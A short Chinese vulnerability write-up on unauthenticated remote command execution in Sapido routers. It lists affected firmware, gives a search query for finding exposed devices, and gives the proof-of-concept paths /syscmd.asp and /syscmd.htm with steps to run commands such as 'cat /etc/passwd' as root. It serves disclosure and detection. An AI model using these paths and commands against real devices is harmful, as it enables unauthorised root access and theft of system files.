# Sapido路由器远程命令执行漏洞

## 漏洞描述

Sapido路由器存在远程命令执行漏洞，攻击者可通过未授权进入命令执行页面，进而可以root权限执行任意命令。

## 影响范围

```
BR270n-v2.1.03
BRC76n-v2.1.03
GR297-v2.1.3
RB1732-v2.0.43
```

网络空间测绘语法：app="Sapido-路由器"

## 漏洞复现

POC

```
http://xxx.xxx.xxx.xxx/syscmd.asp
http://xxx.xxx.xxx.xxx/syscmd.htm
```

1. 访问Sapido路由器web登录页面
2. 访问POC进入命令执行页面 ‘http://xxx.xxx.xxx.xxx:1080/syscmd.htm’
3. 执行ifconfig、cat /etc/passwd等命令

![3.1](https://img-blog.csdnimg.cn/20210419144149248.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTk3NzA0,size_16,color_FFFFFF,t_70)

## 研判分析

- 请求方法、请求路径、请求内容
- 执行命令的返回结果

## 参考链接

Sapido路由器命令执行漏洞

<https://blog.csdn.net/qq_36197704/article/details/115864338>
